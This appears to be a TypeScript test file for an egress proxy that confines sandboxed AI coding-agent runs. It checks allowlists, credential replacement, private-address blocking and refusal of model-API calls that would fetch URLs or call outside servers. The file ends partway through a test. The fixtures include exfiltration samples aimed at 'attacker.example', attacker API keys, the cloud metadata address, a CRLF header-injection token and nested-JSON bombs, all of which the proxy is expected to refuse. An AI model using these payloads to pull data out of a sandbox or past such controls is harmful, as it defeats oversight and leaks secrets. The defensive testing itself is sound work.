import { existsSync, mkdtempSync, readFileSync, rmSync } from 'node:fs';
import { createServer, request, type Server } from 'node:http';
import type { Server as HttpsServer } from 'node:https';
import { connect, type AddressInfo, type Socket } from 'node:net';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { once } from 'node:events';
import { connect as tlsConnect } from 'node:tls';
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it } from 'vitest';
import { httpsUpstream } from '../../test/helpers/egress-upstream.js';
import { CLAUDE_BODY_DEPTH, CLAUDE_BODY_MAX, CLAUDE_READS_MAX, CLAUDE_READS_PER_RUN } from './levels.js';
import { readSecurityLog, refusalSummary } from './security-log.js';
import { EgressProxy, isPrivate, type EgressEntry, type EgressProxyOptions } from './proxy.js';

let dir = '';
let proxy: EgressProxy;
let agent: Server;
let agentPort = 0;

/** Any host, `docs.test` or `api.anthropic.com`, on HTTPS under a CA the proxy's upstream trusts in these tests. */
let upDir = '';
let upServer: HttpsServer;
let upstream: EgressProxyOptions['upstream'];

beforeAll(async () => {
  upDir = mkdtempSync(join(tmpdir(), 'egress-up-'));
  ({ server: upServer, upstream } = await httpsUpstream(upDir, (req, res) => {
    // Half a body, then the connection cut; or a response that never ends.
    if (req.url === '/cut') return void res.writeHead(200, { 'content-length': '100' }).write('half', () => res.destroy());
    if (req.url === '/slow') return void res.writeHead(200).write('start');
    // What it got of the credentials, the betas and the body, when it got any: what the proxy let through to the Claude API (ORC-337).
    const got = (['authorization', 'x-api-key', 'anthropic-beta'] as const).filter((k) => req.headers[k] !== undefined).map((k) => ` ${k}=${req.headers[k]}`).join('');
    let body = '';
    req.on('data', (c: Buffer) => (body += c));
    req.on('end', () => res.end(`up ${req.method} ${req.headers.host} ${req.url}${got}${body ? ` body=${body}` : ''}`));
  }));
});
afterAll(async () => {
  await new Promise((ok) => upServer.close(ok));
  rmSync(upDir, { recursive: true, force: true });
});

beforeEach(async () => {
  dir = mkdtempSync(join(tmpdir(), 'egress-'));
  agent = createServer((req, res) => res.end(`agent ${req.method} ${req.url}`));
  await new Promise<void>((ok) => agent.listen(0, '127.0.0.1', ok));
  agentPort = (agent.address() as AddressInfo).port;
  proxy = new EgressProxy({
    dir,
    caDir: join(dir, 'ca'),
    agentApi: { host: 'host.docker.internal', port: 4101, to: { host: '127.0.0.1', port: agentPort } },
    claudeToken: () => FACTORY_TOKEN,
    upstream,
  });
});

afterEach(async () => {
  await proxy.closeAll();
  await new Promise((ok) => agent.close(ok));
  rmSync(dir, { recursive: true, force: true });
});

/** A plain HTTP request through the run's socket, as the in-sandbox relay hands it over. */
function viaProxy(socketPath: string, method: string, url: string, sent?: string): Promise<{ status: number; body: string }> {
  return new Promise((ok, ko) => {
    const req = request({ socketPath, method, path: url, headers: { host: new URL(url).host } }, (res) => {
      let body = '';
      res.on('data', (c: Buffer) => (body += c));
      res.on('end', () => ok({ status: res.statusCode ?? 0, body }));
    });
    req.on('error', ko).end(sent);
  });
}

/** A CONNECT through the run's socket: the proxy's status line, and the socket. */
function tunnel(socketPath: string, target: string): Promise<{ line: string; socket: Socket }> {
  return new Promise((ok, ko) => {
    const s = connect(socketPath, () => s.write(`CONNECT ${target} HTTP/1.1\r\nHost: ${target}\r\n\r\n`));
    s.once('data', (d: Buffer) => ok({ line: String(d).split('\r\n')[0]!, socket: s }));
    s.on('error', ko);
  });
}

const status = async (socketPath: string, target: string) => {
  const { line, socket } = await tunnel(socketPath, target);
  socket.destroy();
  return line;
};

/** An HTTPS request inside a CONNECT, trusting the factory CA as a sandbox does. */
async function viaTls(socketPath: string, host: string, method: string, path: string, headers: Record<string, string> = {}, alpn = ['http/1.1'], sent?: string | Buffer) {
  const { line, socket } = await tunnel(socketPath, `${host}:443`);
  expect(line).toBe('HTTP/1.1 200 Connection Established');
  const tls = tlsConnect({ socket, servername: host, ca: readFileSync(proxy.caCertPath, 'utf8'), ALPNProtocols: alpn });
  return new Promise<{ status: number; body: string }>((ok, ko) => {
    tls.on('error', ko);
    const req = request({ createConnection: () => tls, method, path, headers: { host, ...headers } }, (res) => {
      let body = '';
      res.on('data', (c: Buffer) => (body += c));
      res.on('end', () => ok({ status: res.statusCode ?? 0, body }));
      res.on('close', () => res.complete || ko(new Error('response cut')));
    });
    req.on('error', ko).end(sent);
  });
}

/**
 * A model call written by hand inside a tunnel: its head and what is given of its body, the rest never sent. What the
 * proxy answers, and when the connection closes.
 */
async function rawModelCall(socketPath: string, headers: Record<string, string>, body = '') {
  const { socket } = await tunnel(socketPath, `${CLAUDE}:443`);
  const tls = tlsConnect({ socket, servername: CLAUDE, ca: readFileSync(proxy.caCertPath, 'utf8'), ALPNProtocols: ['http/1.1'] });
  await once(tls, 'secureConnect');
  let answer = '';
  tls.on('data', (d: Buffer) => (answer += d));
  tls.on('error', () => {});
  const closed = once(tls, 'close');
  tls.write(`POST /v1/messages HTTP/1.1\r\nHost: ${CLAUDE}\r\n${Object.entries(headers).map(([k, v]) => `${k}: ${v}\r\n`).join('')}\r\n${body}`);
  return { tls, answer: () => answer, closed };
}

const until = async (ok: () => boolean) => {
  for (let i = 0; i < 100 && !ok(); i++) await new Promise((r) => setTimeout(r, 20));
};

/** The notes of a run's journal (`EgressNote`): what is no request nor refusal. */
const notes = async (runId: string): Promise<string[]> =>
  (await journal(runId)).filter((e) => (e as unknown as { kind?: string }).kind === 'note').map((e) => (e as unknown as { note: string }).note);

const journal = async (runId: string): Promise<EgressEntry[]> => {
  // Written when the connection closes, a tick after the client sees its end: read once it stops growing.
  const size = () => (existsSync(proxy.journalPath(runId)) ? readFileSync(proxy.journalPath(runId)).length : 0);
  for (let last = -1, i = 0; i < 40; i++) {
    await new Promise((r) => setTimeout(r, 50));
    const now = size();
    if (now > 0 && now === last) break;
    last = now;
  }
  return readFileSync(proxy.journalPath(runId), 'utf8').trim().split('\n').filter(Boolean).map((l) => JSON.parse(l) as EgressEntry);
};

const docs = { level: 'limited' as const, allow: ['docs.test'] };
const FACTORY_TOKEN = 'sk-ant-oat01-the-factory-token';
const CLAUDE = 'api.anthropic.com';

describe('EgressProxy', () => {
  it.skipIf(process.platform === 'win32')('keeps the socket folder of the runs a clean shutdown leaves running, for the next daemon to listen in again (ORC-344)', async () => {
    const path = await proxy.open('run-1', { level: 'none', allow: [] });
    await proxy.closeAll({ keep: true });
    expect(proxy.isOpen('run-1')).toBe(false);
    // The container mounted this folder: the next daemon's socket must appear in it, not in a new one.
    expect(existsSync(dirname(path))).toBe(true);
    const next = new EgressProxy({ dir, caDir: join(dir, 'ca') });
    expect(await next.open('run-1', { level: 'none', allow: [] })).toBe(path);
    expect(existsSync(path)).toBe(true);
    // Left again, then its sandbox destroyed by a daemon that never opened it (`destroyDeadSandboxes`): the folder goes.
    await next.closeAll({ keep: true });
    expect(existsSync(dirname(path))).toBe(true);
    await proxy.close('run-1');
    expect(existsSync(dirname(path))).toBe(false);
  });

  it('refuses a tunnel the policy refuses, and journals it', async () => {
    const sock = await proxy.open('run-1', { level: 'limited', allow: [] });
    expect(await status(sock, 'evil.example:443')).toBe('HTTP/1.1 403 Forbidden');
    expect(await status(sock, 'statsig.anthropic.com:443')).toBe('HTTP/1.1 403 Forbidden');
    expect(await journal('run-1')).toEqual([
      expect.objectContaining({ method: 'CONNECT', host: 'evil.example', ok: false, reason: expect.stringMatching(/not allowed/) as string }),
      expect.objectContaining({ method: 'CONNECT', host: 'statsig.anthropic.com', ok: false }),
    ]);
  });

  it('decrypts an allowed tunnel: a GET passes, journaled with its path, a POST is refused', async () => {
    const sock = await proxy.open('run-1', docs);
    expect(await viaTls(sock, 'docs.test', 'GET', '/page?token=s3cr3t')).toEqual({ status: 200, body: 'up GET docs.test /page?token=s3cr3t' });
    const post = await viaTls(sock, 'docs.test', 'POST', '/form');
    expect(post.status).toBe(403);
    expect(post.body).toMatch(/GET, HEAD and OPTIONS only/);
    const entries = await journal('run-1');
    expect(entries).toEqual([
      expect.objectContaining({ method: 'GET', host: 'docs.test', path: '/page', ok: true }),
      expect.objectContaining({ method: 'POST', host: 'docs.test', path: '/form', ok: false }),
    ]);
    expect(entries[0]!.down).toBeGreaterThan(0);
    expect(JSON.stringify(entries)).not.toContain('s3cr3t');
  });

  it('sends the host it checked upstream, whatever Host the client sets (no fronting)', async () => {
    const sock = await proxy.open('run-1', docs);
    expect((await viaTls(sock, 'docs.test', 'GET', '/', { host: 'evil.example' })).body).toBe('up GET docs.test /');
  });

  it('refuses a request target that is not a path inside a tunnel: an absolute URL could name another host than the one checked (ORC-219)', async () => {
    const sock = await proxy.open('run-1', docs);
    for (const target of ['https://evil.example/x', '*']) expect((await viaTls(sock, 'docs.test', 'OPTIONS', target)).status).toBe(403);
    expect(await journal('run-1')).toContainEqual(expect.objectContaining({ method: 'OPTIONS', host: 'docs.test', ok: false, reason: expect.stringMatching(/not a path/) as string }));
  });

  it('speaks HTTP/1.1 alone: an h2-only client is refused, and journaled', async () => {
    const sock = await proxy.open('run-1', docs);
    await expect(viaTls(sock, 'docs.test', 'GET', '/', {}, ['h2'])).rejects.toThrow();
    expect(await journal('run-1')).toContainEqual(expect.objectContaining({ host: 'docs.test', ok: false }));
  });

  it('refuses a plain write to GitHub, and journals it', async () => {
    const sock = await proxy.open('run-1', { level: 'limited', allow: [] });
    const r = await viaProxy(sock, 'POST', 'http://api.github.com/gists');
    expect(r.status).toBe(403);
    expect(await journal('run-1')).toEqual([expect.objectContaining({ method: 'POST', host: 'api.github.com', path: '/gists', ok: false })]);
  });

  it('tunnels only to port 443 below full', async () => {
    const sock = await proxy.open('run-1', { level: 'limited', allow: [] });
    expect(await status(sock, 'nodejs.org:22')).toBe('HTTP/1.1 403 Forbidden');
  });

  it('never reaches a private address, even at full', async () => {
    const sock = await proxy.open('run-1', { level: 'full', allow: [] });
    expect(await status(sock, `127.0.0.1:${agentPort}`)).toBe('HTTP/1.1 403 Forbidden');
    expect((await viaProxy(sock, 'GET', 'http://localhost/')).status).toBe(502);
    expect((await viaProxy(sock, 'GET', 'http://169.254.169.254/latest/meta-data/')).status).toBe(403);
    expect((await journal('run-1')).map((e) => e.ok)).toEqual([false, false, false]);
  });

  it('tells private addresses from public ones, an IPv4 embedded in an IPv6 included', () => {
    const inside = ['10.1.2.3', '127.0.0.1', '169.254.169.254', '172.17.0.1', '192.168.1.1', '100.64.0.1', '192.0.0.8', '198.18.0.1', '224.0.0.1', '240.0.0.1'];
    const embedded = ['::ffff:10.0.0.1', '::ffff:127.0.0.1', '::ffff:169.254.169.254', '::a00:1', '::ffff:0:a00:1', '64:ff9b::a00:1', '2002:a00:1::1'];
    for (const a of [...inside, ...embedded, '::1', 'fd00::1', 'fe80::1', 'fec0::1', '100::1']) {
      expect(isPrivate(a), a).toBe(true);
    }
    for (const a of ['104.16.10.34', '1.1.1.1', '::ffff:1.1.1.1', '2606:4700::1111']) expect(isPrivate(a), a).toBe(false);
  });

  it('forwards the agent API to the daemon, every method, at any level but none, plain or tunnelled', async () => {
    const sock = await proxy.open('run-1', { level: 'claude-api', allow: [] });
    expect(await viaProxy(sock, 'POST', 'http://host.docker.internal:4101/agent/mcp')).toEqual({ status: 200, body: 'agent POST /agent/mcp' });
    expect(await journal('run-1')).toEqual([
      expect.objectContaining({ method: 'POST', host: 'host.docker.internal', path: '/agent/mcp', ok: true, down: 'agent POST /agent/mcp'.length }),
    ]);
    expect(await status(sock, 'host.docker.internal:4101')).toBe('HTTP/1.1 200 Connection Established');
    const none = await proxy.open('run-2', { level: 'none', allow: [] });
    expect((await viaProxy(none, 'GET', 'http://host.docker.internal:4101/agent/issue')).status).toBe(403);
    expect(await status(none, 'host.docker.internal:4101')).toBe('HTTP/1.1 403 Forbidden');
  });

  it('matches the host whatever its case or trailing dot, and journals it normalised', async () => {
    const sock = await proxy.open('run-1', docs);
    expect((await viaTls(sock, 'DOCS.Test.', 'GET', '/a')).body).toBe('up GET docs.test /a');
    expect(await journal('run-1')).toEqual([expect.objectContaining({ host: 'docs.test', path: '/a', ok: true })]);
  });

  it('journals an upstream cut mid-body as a failure, and ends the client’s response', async () => {
    const sock = await proxy.open('run-1', docs);
    await expect(viaTls(sock, 'docs.test', 'GET', '/cut')).rejects.toThrow();
    expect(await journal('run-1')).toEqual([expect.objectContaining({ path: '/cut', ok: false })]);
  });

  it('journals what is in flight when the run closes', async () => {
    const sock = await proxy.open('run-1', docs);
    const { socket } = await tunnel(sock, 'docs.test:443');
    const tls = tlsConnect({ socket, servername: 'docs.test', ca: readFileSync(proxy.caCertPath, 'utf8') });
    const started = new Promise<void>((ok) => request({ createConnection: () => tls, path: '/slow', headers: { host: 'docs.test' } }, () => ok()).on('error', () => {}).end());
    await started;
    const path = proxy.journalPath('run-1');
    await proxy.close('run-1');
    expect(readFileSync(path, 'utf8')).toContain('"path":"/slow"');
  });

  it('pipes another port as is at full, never to a private address', async () => {
    const sock = await proxy.open('run-1', { level: 'full', allow: [] });
    expect(await status(sock, 'localhost:22')).toBe('HTTP/1.1 502 Bad Gateway');
    expect(await journal('run-1')).toEqual([expect.objectContaining({ method: 'CONNECT', host: 'localhost', port: 22, ok: false, reason: expect.stringMatching(/private/) as string })]);
  });

  describe('the Claude API (ORC-337)', () => {
    const attacker = { authorization: 'Bearer sk-ant-api03-attacker', 'x-api-key': 'sk-ant-api03-attacker' };
    /** A model call through a tunnel, its body JSON. */
    const call = (sock: string, body: unknown, headers: Record<string, string> = {}, path = '/v1/messages?beta=true') => viaTls(sock, CLAUDE, 'POST', path, headers, undefined, JSON.stringify(body));
    const MESSAGE = { model: 'claude-haiku-4-5', max_tokens: 1, messages: [{ role: 'user', content: 'hi' }], tools: [{ name: 'Bash', input_schema: { type: 'object' } }] };
    const sentBody = JSON.stringify(MESSAGE);

    it("replaces any credential of the client with the run's token, tunnelled or plain", async () => {
      const sock = await proxy.open('run-1', { level: 'claude-api', allow: [] });
      expect(await call(sock, MESSAGE, attacker)).toEqual({ status: 200, body: `up POST ${CLAUDE} /v1/messages?beta=true authorization=Bearer ${FACTORY_TOKEN} body=${sentBody}` });
      expect((await call(sock, MESSAGE, { authorization: 'Bearer set-by-the-factory-egress-proxy' }, '/v1/messages/count_tokens')).body).toBe(`up POST ${CLAUDE} /v1/messages/count_tokens authorization=Bearer ${FACTORY_TOKEN} body=${sentBody}`);
      expect((await viaTls(sock, CLAUDE, 'GET', '/api/claude_code/settings', attacker)).body).toBe(`up GET ${CLAUDE} /api/claude_code/settings authorization=Bearer ${FACTORY_TOKEN}`);
      expect((await viaProxy(sock, 'POST', `http://${CLAUDE}/v1/messages`, sentBody)).body).toBe(`up POST ${CLAUDE} /v1/messages authorization=Bearer ${FACTORY_TOKEN} body=${sentBody}`);
      // The journal never holds a token; the bytes sent count the body read whole.
      const entries = await journal('run-1');
      expect(JSON.stringify(entries)).not.toMatch(/sk-ant/);
      expect(entries[0]).toMatchObject({ path: '/v1/messages', ok: true, up: sentBody.length });
    });

    it('sets the token the run was opened with, the daemon\'s over the control socket, and none for an explicit undefined', async () => {
      const own = await proxy.openRun('run-1', { level: 'limited', allow: [] }, 'sk-ant-oat01-of-this-run');
      expect((await call(own, MESSAGE, attacker)).body).toBe(`up POST ${CLAUDE} /v1/messages?beta=true authorization=Bearer sk-ant-oat01-of-this-run body=${sentBody}`);
      // The proxy's own option does not fill in: undefined from the daemon is no token.
      const none = await proxy.openRun('run-2', { level: 'limited', allow: [] }, undefined);
      expect((await call(none, MESSAGE, attacker)).body).toBe(`up POST ${CLAUDE} /v1/messages?beta=true body=${sentBody}`);
    });

    it('updates the token of a run opened again: a daemon restarted with another account', async () => {
      const sock = await proxy.openRun('run-1', { level: 'limited', allow: [] }, 'sk-ant-oat01-first');
      expect(await proxy.openRun('run-1', { level: 'limited', allow: [] }, 'sk-ant-oat01-second')).toBe(sock);
      expect((await call(sock, MESSAGE)).body).toContain('authorization=Bearer sk-ant-oat01-second ');
      await proxy.openRun('run-1', { level: 'limited', allow: [] }, undefined);
      expect((await call(sock, MESSAGE)).body).not.toContain('authorization');
    });

    it('keeps the betas Claude Code sends, drops any other, and journals each dropped one once per run', async () => {
      const sock = await proxy.open('run-1', { level: 'claude-api', allow: [] });
      const r = await call(sock, MESSAGE, { 'anthropic-beta': 'oauth-2025-04-20, mcp-client-2025-11-20,claude-code-20250219,code-execution-2025-08-25' });
      expect(r.body).toContain(' anthropic-beta=oauth-2025-04-20,claude-code-20250219 ');
      expect((await call(sock, MESSAGE, { 'anthropic-beta': 'files-api-2025-04-14,mcp-client-2025-11-20' })).body).not.toContain('anthropic-beta');
      expect(await notes('run-1')).toEqual([
        'anthropic-beta mcp-client-2025-11-20 dropped, the request went on without it',
        'anthropic-beta code-execution-2025-08-25 dropped, the request went on without it',
        'anthropic-beta files-api-2025-04-14 dropped, the request went on without it',
      ]);
      // Notes, not refusals: the security log and the summary posted on the ticket see two requests that went through.
      const log = readSecurityLog({ runId: 'run-1', projectId: 'p', ticketId: 'T-1', at: 0 }, { egress: proxy.journalPath('run-1'), refusals: join(dir, 'none.jsonl') });
      expect(log.egress.map((e) => e.ok)).toEqual([true, true]);
      expect(log.skipped.egress).toBe(0);
      expect(refusalSummary(log)).toBeUndefined();
    });

    it('refuses content Anthropic would fetch by URL, in a message, a tool result or the system prompt', async () => {
      const sock = await proxy.open('run-1', { level: 'limited', allow: [] });
      const url = 'https://attacker.example/x?data=secret';
      const bodies = [
        { ...MESSAGE, messages: [{ role: 'user', content: [{ type: 'image', source: { type: 'url', url } }] }] },
        { ...MESSAGE, messages: [{ role: 'user', content: [{ type: 'tool_result', tool_use_id: 't', content: [{ type: 'document', source: { type: 'url', url } }] }] }] },
        { ...MESSAGE, system: [{ type: 'text', text: 'x', citations: [{ type: 'web_search_result_location', url }] }] },
      ];
      for (const body of bodies) expect((await call(sock, body, attacker)).status, JSON.stringify(body)).toBe(403);
      expect((await journal('run-1')).map((e) => e.reason)).toEqual([
        'Claude API body refused: a image block sourced by url',
        'Claude API body refused: a document block sourced by url',
        'Claude API body refused: a text block cited by url',
      ]);
    });

    it('sends on the call as it checked it, serialised again: a duplicate key cannot hide a server tool', async () => {
      const sock = await proxy.open('run-1', { level: 'limited', allow: [] });
      const raw = '{"model":"m","tools":[{"type":"web_fetch_20250910","name":"f"}],"tools":[],"messages":[]}';
      expect((await viaTls(sock, CLAUDE, 'POST', '/v1/messages', {}, undefined, raw)).body).toBe(`up POST ${CLAUDE} /v1/messages authorization=Bearer ${FACTORY_TOKEN} body={"model":"m","tools":[],"messages":[]}`);
    });

    it('refuses a model call that would make Anthropic\'s servers call out, and journals it', async () => {
      const sock = await proxy.open('run-1', { level: 'limited', allow: [] });
      const exfil = [
        { ...MESSAGE, mcp_servers: [{ type: 'url', url: 'https://attacker.example/mcp', name: 'x' }] },
        { ...MESSAGE, tools: [...MESSAGE.tools, { type: 'web_fetch_20250910', name: 'web_fetch' }] },
        { ...MESSAGE, tools: [{ type: 'web_search_20250305', name: 'web_search' }] },
        { ...MESSAGE, tools: [{ type: 'code_execution_20250825', name: 'code_execution' }] },
        { ...MESSAGE, tools: [{ type: 'mcp_toolset', mcp_server_name: 'x' }] },
        { ...MESSAGE, container: 'container_1' },
      ];
      for (const body of exfil) {
        const r = await call(sock, body, attacker);
        expect(r.status, JSON.stringify(body)).toBe(403);
        expect(r.body).toMatch(/Claude API body refused/);
      }
      for (const [sent, reason] of [['not json', /not JSON/], ['[1]', /not a JSON object/]] as const) {
        expect((await viaTls(sock, CLAUDE, 'POST', '/v1/messages', {}, undefined, sent)).body).toMatch(reason);
      }
      expect((await viaProxy(sock, 'POST', `http://${CLAUDE}/v1/messages`, JSON.stringify(exfil[0]))).status).toBe(403);
      expect((await call(sock, MESSAGE, { 'content-encoding': 'gzip' })).body).toMatch(/content-encoding gzip/);
      const entries = await journal('run-1');
      expect(entries).toHaveLength(exfil.length + 4);
      expect(entries.every((e) => !e.ok && e.host === CLAUDE)).toBe(true);
      expect(entries[0]).toMatchObject({ path: '/v1/messages', reason: 'Claude API body refused: mcp_servers' });
    });

    it('lets client tools through, Anthropic-defined ones included', async () => {
      const sock = await proxy.open('run-1', { level: 'limited', allow: [] });
      const client = { ...MESSAGE, tools: [{ name: 'Read', type: 'custom', input_schema: {} }, { type: 'bash_20250124', name: 'bash' }, { type: 'text_editor_20250728', name: 'str_replace_based_edit_tool' }] };
      expect((await call(sock, client)).status).toBe(200);
    });

    it('answers 413 to a model call over its cap, the client reading it before the connection closes, by its declared length or as it streams', async () => {
      const sock = await proxy.open('run-1', { level: 'limited', allow: [] });
      // Declared: answered at once, `Connection: close`; what the client still sends is drained, not met with a reset.
      const declared = await rawModelCall(sock, { 'content-length': String(CLAUDE_BODY_MAX + 1) }, ' '.repeat(512 * 1024));
      await declared.closed;
      expect(declared.answer()).toMatch(/^HTTP\/1.1 413 Payload Too Large\r\n/);
      expect(declared.answer()).toMatch(/\r\nconnection: close\r\n/i);
      expect(declared.answer()).toContain(`egress proxy: Claude API body refused: over ${CLAUDE_BODY_MAX} bytes`);
      // Streamed: refused once past the cap, the answer read whole by Node's own client.
      const big = Buffer.alloc(CLAUDE_BODY_MAX + 1, 0x20);
      expect(await viaTls(sock, CLAUDE, 'POST', '/v1/messages', { 'transfer-encoding': 'chunked' }, undefined, big)).toEqual({ status: 413, body: `egress proxy: Claude API body refused: over ${CLAUDE_BODY_MAX} bytes\n` });
      expect((await journal('run-1')).map((e) => [e.ok, e.reason])).toEqual([
        [false, `Claude API body refused: over ${CLAUDE_BODY_MAX} bytes`],
        [false, `Claude API body refused: over ${CLAUDE_BODY_MAX} bytes`],
      ]);
    }, 30_000);

    it('answers 502 to a request it cannot send on, a header Node refuses, and stays up', async () => {
      // A token a header cannot carry: the boot refuses one (factory-yml), the control socket could still hand one over.
      const bad = await proxy.openRun('run-1', { level: 'limited', allow: [] }, 'sk-ant-oat01-x\r\nX-Injected: 1');
      const get = await viaTls(bad, CLAUDE, 'GET', '/api/claude_code/settings');
      expect(get.status).toBe(502);
      expect(get.body).toMatch(/^egress proxy: not sent on: /);
      expect((await call(bad, MESSAGE)).status).toBe(502);
      expect((await viaProxy(bad, 'GET', `http://${CLAUDE}/api/claude_code/settings`)).status).toBe(502);
      expect((await journal('run-1')).map((e) => [e.ok, e.reason?.slice(0, 12)])).toEqual([
        [false, 'not sent on:'],
        [false, 'not sent on:'],
        [false, 'not sent on:'],
      ]);
      // Up, and its places given back: the next run's calls go through.
      const good = await proxy.open('run-2', { level: 'limited', allow: [] });
      for (let i = 0; i < CLAUDE_READS_PER_RUN + 1; i++) expect((await call(good, MESSAGE)).status).toBe(200);
    });

    it('lists 64 dropped betas per run at most, then notes once that the rest are not listed', async () => {
      const sock = await proxy.open('run-1', { level: 'claude-api', allow: [] });
      const betas = (from: number, n: number) => Array.from({ length: n }, (_, i) => `made-up-${from + i}`).join(',');
      expect((await call(sock, MESSAGE, { 'anthropic-beta': `oauth-2025-04-20,${betas(0, 70)}` })).body).toContain(' anthropic-beta=oauth-2025-04-20 ');
      await call(sock, MESSAGE, { 'anthropic-beta': betas(100, 10) });
      const listed = await notes('run-1');
      expect(listed).toHaveLength(65);
      expect(listed[63]).toBe('anthropic-beta made-up-63 dropped, the request went on without it');
      expect(listed[64]).toBe('more anthropic-beta values dropped: past 64, they are not listed');
    });

    it('holds a few model calls at once, a share per run within the bound in all: past it a 429 note; a client gone is noted and frees its place', async () => {
      const ids = Array.from({ length: CLAUDE_READS_MAX / CLAUDE_READS_PER_RUN + 1 }, (_, i) => `run-${i + 1}`);
      const runs = await Promise.all(ids.map((id) => proxy.open(id, { level: 'limited', allow: [] })));
      const half = { 'content-length': '100' };
      const pause = () => new Promise((r) => setTimeout(r, 100)); // their heads read by the proxy
      const held = await Promise.all(Array.from({ length: CLAUDE_READS_PER_RUN }, () => rawModelCall(runs[0]!, half, '{"model":')));
      await pause();
      // The run's share is full: its next one waits for a retry, the other runs are served.
      const extra = await rawModelCall(runs[0]!, half, '{');
      await extra.closed;
      expect(extra.answer()).toMatch(/^HTTP\/1.1 429/);
      // The other runs fill what is left of the bound in all; one run more gets a 429.
      for (const sock of runs.slice(1, -1)) held.push(...(await Promise.all(Array.from({ length: CLAUDE_READS_PER_RUN }, () => rawModelCall(sock, half, '{')))));
      await pause();
      const last = await rawModelCall(runs.at(-1)!, half, '{');
      await last.closed;
      expect(last.answer()).toMatch(/^HTTP\/1.1 429/);
      // Gone while it sends: noted, and the place is free again.
      for (const c of held) c.tls.destroy();
      const gone = 'model call dropped: its client went away while sending the body';
      await until(() => readFileSync(proxy.journalPath('run-1'), 'utf8').split(gone).length - 1 === CLAUDE_READS_PER_RUN);
      expect(await notes('run-1')).toEqual(['model call throttled: too many held at once (429)', gone, gone]);
      expect((await call(runs.at(-1)!, MESSAGE)).status).toBe(200);
      // A throttle and a client gone are no refusals.
      expect((await journal('run-1')).filter((e) => e.ok === false)).toEqual([]);
    });

    it('cuts a model call whose body is too slow to come in, and frees its place', async () => {
      const slow = new EgressProxy({ dir: join(dir, 'slow'), caDir: join(dir, 'ca'), claudeToken: () => FACTORY_TOKEN, upstream, claudeReadMs: 200 });
      try {
        await proxy.open('run-0', { level: 'limited', allow: [] }); // the CA viaTls trusts
        const sock = await slow.open('run-1', { level: 'limited', allow: [] });
        const calls = await Promise.all(Array.from({ length: CLAUDE_READS_PER_RUN }, () => rawModelCall(sock, { 'content-length': '100' }, '{')));
        for (const c of calls) await c.closed;
        expect(calls.map((c) => c.answer().split('\r\n')[0])).toEqual(calls.map(() => 'HTTP/1.1 408 Request Timeout'));
        expect((await call(sock, MESSAGE)).status).toBe(200);
        const lines = readFileSync(slow.journalPath('run-1'), 'utf8');
        expect(lines.split('model call cut: its body too slow to come in').length - 1).toBe(CLAUDE_READS_PER_RUN);
      } finally {
        await slow.closeAll();
      }
    });

    it('waits for a model call being read before it closes the run, and notes it', async () => {
      const sock = await proxy.open('run-1', { level: 'limited', allow: [] });
      await rawModelCall(sock, { 'content-length': '100' }, '{');
      const path = proxy.journalPath('run-1');
      await new Promise((r) => setTimeout(r, 100)); // its head read by the proxy
      await proxy.close('run-1');
      expect(readFileSync(path, 'utf8')).toContain('model call dropped: its client went away while sending the body');
    });

    it('survives a call nested by the hundred thousand, in a tool call\'s input or an unknown field, and refuses it', async () => {
      const sock = await proxy.open('run-1', { level: 'limited', allow: [] });
      const n = 200_000;
      const deep = `${'['.repeat(n)}${']'.repeat(n)}`;
      const inInput = `{"model":"m","messages":[{"role":"assistant","content":[{"type":"tool_use","id":"t","name":"Bash","input":{"x":${deep}}}]}]}`;
      const inUnknown = `{"model":"m","messages":[],"whatever":${deep}}`;
      for (const raw of [inInput, inUnknown]) {
        const r = await viaTls(sock, CLAUDE, 'POST', '/v1/messages', {}, undefined, raw);
        expect(r).toEqual({ status: 403, body: `egress proxy: Claude API body refused: nested deeper than ${CLAUDE_BODY_DEPTH}\n` });
      }
      // Still up, and the next call goes through.
      expect((await call(sock, MESSAGE)).status).toBe(200);
      // Brackets inside strings are text: no nesting.
      const inString = { ...MESSAGE, messages: [{ role: 'user', content: `${'['.repeat(1000)} \\" {{{` }] };
      expect((await call(sock, inString)).status).toBe(200);
    });

    it('refuses a body that is not UTF-8, or a number a double cannot hold: what goes on is what was checked', async () => {
      const sock = await proxy.open('run-1', { level: 'limited', allow: [] });
      const latin1 = Buffer.concat([Buffer.from('{"model":"m","messages":[{"role":"user","content":"caf'), Buffer.from([0xe9]), Buffer.from('"}]}')]);
      expect((await viaTls(sock, CLAUDE, 'POST', '/v1/messages', {}, undefined, latin1)).body).toMatch(/not JSON in UTF-8/);
      for (const n of ['1e400', '-1e400', '1' + '0'.repeat(400)]) {
        expect((await viaTls(sock, CLAUDE, 'POST', '/v1/messages', {}, undefined, `{"model":"m","max_tokens":${n},"messages":[]}`)).body, n).toMatch(/out of range/);
      }
      expect((await viaTls(sock, CLAUDE, 'POST', '/v1/messages', {}, undefined, '{"model":"m","max_tokens":1e3,"temperature":-0.5,"messages":[]}')).status).toBe(200);
    });

    it("sends none of the client's credentials when the factory has no token", async () => {
      const bare = new EgressProxy({ dir: join(dir, 'bare'), caDir: join(dir, 'ca'), upstream });
      try {
        // The same CA: the one viaTls trusts, made by the first open.
        await proxy.open('run-0', { level: 'claude-api', allow: [] });
        const sock = await bare.open('run-1', { level: 'claude-api', allow: [] });
        expect((await call(sock, MESSAGE, attacker)).body).toBe(`up POST ${CLAUDE} /v1/messages?beta=true body=${sentBody}`);
      } finally {
        await bare.closeAll();
      }
    });

    it('refuses a path Claude Code does not call, /v1/files first, and journals it', async () => {
      const sock = await proxy.open('run-1', { level: 'limited', allow: [] });
      const files = await viaTls(sock, CLAUDE, 'POST', '/v1/files', attacker);
      expect(files.status).toBe(403);
      expect(files.body).toMatch(/not a call of Claude Code/);
      expect((await viaProxy(sock, 'POST', `http://${CLAUDE}/v1/files`)).status).toBe(403);
      expect((await viaTls(sock, CLAUDE, 'POST', '/api/event_logging/v2/batch')).status).toBe(403);
      expect(await journal('run-1')).toEqual([
        expect.objectContaining({ method: 'POST', host: CLAUDE, path: '/v1/files', ok: false }),
        expect.objectContaining({ method: 'POST', host: CLAUDE, path: '/v1/files', ok: false }),
        expect.objectContaining({ method: 'POST', host: CLAUDE, path: '/api/event_logging/v2/batch', ok: false }),
      ]);
    });

    it('refuses the OAuth refresh hosts: the sandbox holds no refresh token', async () => {
      const sock = await proxy.open('run-1', { level: 'claude-api', allow: [] });
      expect(await status(sock, 'console.anthropic.com:443')).toBe('HTTP/1.1 403 Forbidden');
      expect(await status(sock, 'platform.claude.com:443')).toBe('HTTP/1.1 403 Forbidden');
    });

    it('leaves the credentials and the body of other hosts alone', async () => {
